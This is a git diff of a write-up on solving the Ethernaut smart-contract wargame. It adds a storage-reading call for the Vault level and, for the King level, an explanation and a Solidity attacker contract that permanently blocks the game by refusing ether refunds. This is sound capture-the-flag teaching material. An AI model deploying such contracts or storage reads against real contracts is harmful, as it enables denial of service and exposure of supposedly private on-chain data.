@@ -112,11 +112,34 @@ contract.sendTransaction({from: player, to: this, value:0, data: "0xdd365b8b" })
 ```
 
 
- # 8. Force
+# 8. Force
 
 
- # 9. Vault
- ```
- web3.eth.getStorageAt(instance, "1")
- ```
+
+# 9. Vault
+```
+web3.eth.getStorageAt(instance, "1")
+```
+
+# 10. King
+This level consists of a game to claim the King title. Our aim is to break it.  
+We notice that the previous king receives `msg.value` using `transfer()` and that the `msg.sender` becomes the king once the transfer is succeeded. But what if this previous king couldn't receive any ether?  
+So, in order to break the game, we need to make a contract that can't receive ether, in other words, it doesn't implement a `receive()` nor a `fallabck()` function.
+```
+contract Hack{
+    address public victim;
+
+    constructor(address _victim){
+        victim = _victim;
+    }
+
+    function attack() public payable{
+        (bool success,) = payable(victim).call{value: msg.value}("");
+        require(success);
+    }
+
+}
+```
+
+# 11. Re-entrancy
 
